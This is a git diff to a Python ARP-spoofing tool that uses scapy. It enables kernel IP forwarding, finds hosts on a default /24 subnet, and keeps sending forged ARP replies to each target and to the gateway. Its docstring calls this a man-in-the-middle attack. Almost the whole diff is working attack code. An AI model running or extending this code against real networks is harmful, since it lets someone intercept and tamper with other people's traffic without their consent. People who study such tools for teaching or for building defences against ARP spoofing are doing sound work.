@@ -24,8 +24,12 @@ fh.setFormatter(formatter)
 logger.addHandler(fh)
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
+# DO NOT CHANGE THIS VALUES! USE CONFIG INSTEAD!
 DEFAULT_GATEWAY = '192.168.0.1'
+DEFAULT_NETWORK = "192.168.0.0/24"
+INTERVAL = 100
 CommandQueue = queue.Queue()
+counter = 0
 
 
 class ARPspoofer(threading.Thread):
@@ -39,9 +43,6 @@ class ARPspoofer(threading.Thread):
         """"""
         threading.Thread.__init__(self)
         self.event = event
-        '''
-        self.kernel_ipv4fwd = None
-        '''
         self.gw = None
         self.network = None
         self.delay = None
@@ -54,48 +55,77 @@ class ARPspoofer(threading.Thread):
         if os.getuid():
             logger.error("Run me as root!")
             sys.exit(-1)
-
-        logger.info("Loading config...")
+        logger.warning("Used kernel ipv4 forwarding feature.")
+        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+        logger.info("Kernel IPv4 forwarding enabled")
         self.__config_load(config)
 
+
     def __config_load(self, config={}):
-        """"""
-        self.kernel_ipv4fwd = config.get('kernel_ip4_fwd', 1)
-        if self.kernel_ipv4fwd:
-            logger.warning("Used kernel ipv4 forwarding feature.")
-            os.system("echo {} > /proc/sys/net/ipv4/ip_forward".format(self.kernel_ipv4fwd))
-            logger.info("Kernel IPv4 forwarding enabled")
-
-        else:
-            logger.error("Not implemented!")
-
+        """
+        Loading config from config dict
+        :param config: dictionary of settings
+        :return: None
+        """
+        logger.info("Loading config...")
+        print(config)
         self.gw = config.get('gateway', None)
         if not self.gw:
             logger.critical("IP of gateway not specified! Using default one: {}".format(DEFAULT_GATEWAY))
             self.gw = DEFAULT_GATEWAY
+
+        mac = utils.arpping(self.gw)
+        while mac is None:
+            logger.debug('Cannot obtain MAC addr of the gateway. Make sure {} is correct!'.format(self.gw))
             mac = utils.arpping(self.gw)
-            self.ip_mac[self.gw] = mac
+        self.ip_mac[self.gw] = mac
+        logger.debug('Gateway MAC addr: {}'.format(mac))
 
+        self.network = config.get('network', None)
+        if self.network is None:
+            logger.debug('Using default network! {}'.format(DEFAULT_NETWORK))
+            self.network = DEFAULT_NETWORK
 
-    def __config_reload(self, config={}):
-        """"""
-        pass
-
+        self.targets = config.get('target', None)
+        if not self.targets:
+            logger.debug('No explicit targets found! Calculating from the net!')
+            self.targets = utils.get_hosts(self.network)
+        logger.debug('Targets: {}'.format(self.targets))
+        for t in self.targets:
+            mac = utils.arpping(t)
+            if mac is not None:
+                logger.debug('Target {} has MAC: {}'.format(t, mac))
+                self.ip_mac[t] = mac
 
     def __spoof(self):
+        """
+        Main spoofing function. Iterates through the targets lists and sends two packets each iteration.
+        ARP response to target and gateway, putting this machine in the middle. Basics of MITM attack via
+        ARP spoofing
+        :return: None
+        """
+        global counter
         for ip, mac in self.ip_mac.items():
             if ip == self.gw:
                 continue
-            logger.debug('Sending ARP spoof message! Target: {}'.format(ip))
             pkt = ARP(op=2, pdst=ip, psrc=self.gw, hwdst=mac)
-            logger.debug('{}'.format(pkt.summary()))
-            send(pkt)
-            logger.debug('Sending ARP spoof message to GW with target: {}'.format(ip))
+            if counter == INTERVAL:
+                logger.debug('Sending ARP spoof message! Target: {}'.format(ip))
+                logger.debug('{}'.format(pkt.summary()))
+            send(pkt, verbose=0)
+
             pkt = ARP(op=2, pdst=self.gw, psrc=ip, hwdst=self.ip_mac[self.gw])
-            logger.debug('{}'.format(pkt.summary()))
-            send(pkt)
+            if counter == INTERVAL:
+                logger.debug('Sending ARP spoof message to GW with target: {}'.format(ip))
+                logger.debug('{}'.format(pkt.summary()))
+            send(pkt, verbose=0)
 
     def __execute_cmd(self, cmd):
+        """
+        Helper function executing commands. Creates changes runtime.
+        :param cmd: touple of arguments
+        :return: None
+        """
         if not isinstance(cmd, list):
             logger.critical('Unknown command! {}'.format(cmd))
 
@@ -128,12 +158,20 @@ class ARPspoofer(threading.Thread):
 
         else:
             logger.critical('Unknown command!')
-            raise AttributeError
 
     def __spoof_loop(self):
+        """
+        Main spoof loop function. Invokes spoofing function until threading-end event is set.
+        It also resolves IP addresses to MAC using arpping from utils.
+        :return:
+        """
+        global counter
         try:
             while not self.event.is_set():
-                logger.debug('Iterating...')
+                if counter == INTERVAL:
+                    logger.debug('Iterating...')
+                else:
+                    counter += 1
                 while not self.queue.empty() and not self.event.is_set():
                     cmd = self.queue.get()
                     logger.debug('New command: {}'.format(cmd))
@@ -146,17 +184,21 @@ class ARPspoofer(threading.Thread):
 
                 self.__spoof()
                 time.sleep(0.10)
+                if counter == INTERVAL:
+                    counter = 0
         except KeyboardInterrupt:
             logger.info('Exiting by KeyboardInterrupt')
         finally:
             print("arpspoofer exiting!")
 
     def run(self):
+        """
+        Run method overrides threading.run method for parallel execution.
+        :return:
+        """
         self.__spoof_loop()
         try:
-            if self.kernel_ipv4fwd:
-                self.kernel_ipv4fwd = 0
-                os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
         except AttributeError:
             pass
         return
